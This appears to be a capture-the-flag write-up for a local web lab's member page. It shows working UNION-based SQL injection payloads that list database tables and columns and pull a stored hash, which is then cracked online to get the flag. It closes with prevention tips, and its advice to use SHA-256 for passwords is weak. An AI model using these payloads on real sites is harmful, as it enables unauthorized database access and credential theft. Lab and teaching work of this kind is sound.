## where

http://localhost:8080/?page=member


## Explanation

SQL injection vulnerabilities occur when an attacker is able to insert or "inject" a SQL query via the input data from the client to the application. This document details various types of SQL injection attacks, including table name disclosure, boolean-based SQL injection, column name disclosure, and data extraction, highlighting the potential for unauthorized access to or manipulation of database information.


## Queries

### basic example
    1 OR 1=1
example: in backend if there is:
    SELECT * FROM users WHERE id = '1 OR 1=1';
    SELECT * FROM users WHERE id = 1 OR 1=1; (true)
returns everything from the table users

With this we know we can obtain 2 columns


### table names
    1 OR 1=2 UNION SELECT null, table_name FROM information_schema.tables
We'll need the table 'users'

### column names
    1 UNION SELECT table_name, column_name FROM information_schema.columns
    or
    1 OR 1=2 UNION SELECT table_name, column_name FROM information_schema.columns
We'll need the columns 'Commentaire' and 'countersign'

### extract table data
    1 OR 1=2 UNION SELECT Commentaire, countersign from users
we get:
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname : 5ff9d0165b4f92b14994e5c685cdce28


## Decrypt password
Decrypt '5ff9d0165b4f92b14994e5c685cdce28' with MD5
https://md5decrypt.net/en/

Output = 'FortyTwo'

Convert to lowercase and encrypt with SHA256

run script


## How to prevent

Parameterized Queries: Use parameterized queries to prevent SQL injection, as they ensure that the input is treated as a data value rather than part of the SQL command.

Input Validation: Implement strict input validation checks to reject suspicious or malformed data.

Use of Prepared Statements: With prepared statements, the SQL query is defined separately from its parameters, minimizing the risk of injection.

Employ Stronger Hashing Algorithms: Replace MD5 with more secure hashing algorithms like SHA-256 to enhance cryptographic security.
